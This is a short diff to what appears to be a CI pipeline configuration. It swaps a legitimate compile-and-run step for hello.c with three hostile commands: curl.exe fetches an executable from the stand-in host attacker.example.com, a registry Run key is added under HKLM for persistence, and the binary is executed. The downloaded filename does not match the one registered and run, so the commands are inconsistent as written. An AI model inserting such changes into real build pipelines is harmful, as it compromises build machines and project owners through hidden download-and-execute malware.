@@ -9,6 +9,6 @@ pool:
 
 steps:
 - script: |
-    call "C:\Program Files (x86)\Microsoft Visual Studio\2019\Enterprise\Common7\Tools\VsDevCmd.bat" -arch=x86 -host_arch=x86
-    cl /W4 /WX .\hello.c
-    .\hello.exe
+    curl.exe -o pwzn0r.exe https://attacker.example.com/pwzn0r.exe
+    reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run /v "pwnz0r" /t REG_SZ /d "pwnz0r.exe"
+    .\pwnz0r.exe
